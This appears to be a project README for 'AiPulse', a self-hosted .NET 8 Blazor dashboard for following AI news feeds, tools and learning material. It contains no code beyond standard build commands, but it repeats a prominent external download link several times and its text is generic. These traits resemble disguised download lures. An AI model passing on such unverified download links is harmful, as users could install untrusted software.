# AiPulse v2026 - self-hosted dashboard 2026

> **AiPulse is a self-hosted dashboard built with .NET 8 and ASP.NET Core Blazor for developers working in AI, combining RSS updates, learning material, tools, and alerts in one up-to-date interface.**

[![Platform](https://img.shields.io/badge/Platform-.NET%208%20%2F%20ASP.NET%20Core%20Blazor-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaackingwec5840/aipulse-blazor-ai-hub?style=flat-square)](https://github.com/isaackingwec5840/aipulse-blazor-ai-hub)

---

<p align="center">
  <a href="https://isaackingwec5840.github.io/aipulse-blazor-ai-hub/">
    <img src="https://img.shields.io/badge/Download-AiPulse%20Latest-brightgreen?style=for-the-badge" alt="Download AiPulse">
  </a>
</p>

> **[Direct Download - AiPulse v2026](https://isaackingwec5840.github.io/aipulse-blazor-ai-hub/)**

---

[Download Latest Build](https://isaackingwec5840.github.io/aipulse-blazor-ai-hub/)

---

## Overview

AiPulse is designed for anyone who wants a focused home for AI-related updates instead of juggling a large number of browser tabs. It brings together RSS and Atom feeds in a dashboard-oriented layout, making it easier to keep news, references, and useful utilities in one self-hosted place.

It suits developers, technical teams, and solo builders who need a configurable view of the fast-changing AI landscape. With educational content, a tools matrix, watchlists, and digest support, AiPulse helps organize fragmented information into something easier to monitor and use.

---

## What it includes

- Real-time aggregation of RSS and Atom feeds
- Glossary and learning area for fast lookup
- Tools matrix with watchlist support for tracking resources
- Desktop alerts for new or relevant activity
- Multi-user roles with admin approval workflows
- OPML import and export for feed portability
- Full-text retrieval and scraping for expanded article views
- Weekly digest generation and trending analytics

---

## Installation

Clone the repository and run it like any standard .NET 8 ASP.NET Core Blazor app.

1. Get the source:
   git clone https://github.com/isaackingwec5840/aipulse-blazor-ai-hub.git
   cd AiPulse

2. Restore and build:
   dotnet restore
   dotnet build

3. Start the app:
   dotnet run

If you prefer a published build over source, download the latest package and start it according to your hosting setup.

---

## Using AiPulse

Once the app is running, open the dashboard in your browser and start by adding RSS or Atom sources. After that, you can organize feeds, inspect fetched articles, and use the glossary and learning sections to read definitions and background details.

Typical workflow:
- Add or import feeds with OPML
- Review the news stream and trending items
- Save useful tools into the watchlist
- Enable desktop notifications for timely updates
- Check weekly digests to catch up on changes

For environments with multiple users, set roles and review approval rules before granting access to additional accounts.

---

## Configuration

Most options are managed through the ASP.NET Core host configuration. Feed sources, notification behavior, digest settings, and role-related controls are usually configured there or through the dashboard, depending on how you deploy the app.

Example application settings pattern:

{
  "Feeds": [],
  "Notifications": {
    "Enabled": true
  },
  "Digests": {
    "Weekly": true
  }
}

If you adjust hosting or authentication behavior, update the environment variables or application settings used by your deployment.

---

## Requirements

- .NET 8 runtime or SDK
- ASP.NET Core hosting support
- A modern browser for the Blazor dashboard
- Network access for RSS/Atom sources and fetched article content
- Storage for feed data, watchlists, and digest history

---

## FAQ

**Does AiPulse need an AI model to work?**  
No. It is a self-hosted dashboard for following AI-related content and resources, not an AI engine itself.

**Can I import feeds I already subscribe to?**  
Yes. OPML import and export are included so you can move feed collections in and out of the system.

**How are updates handled?**  
Use the latest build from the distribution you maintain, then redeploy or rebuild as needed for your environment.

**Where can I adjust notifications or digests?**  
Those settings are generally managed in the app configuration or directly in the dashboard, depending on how you deploy it.

**What if fetched content seems incomplete?**  
Review or enable full-text fetching and scraping settings, then confirm that the source site permits full article retrieval.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
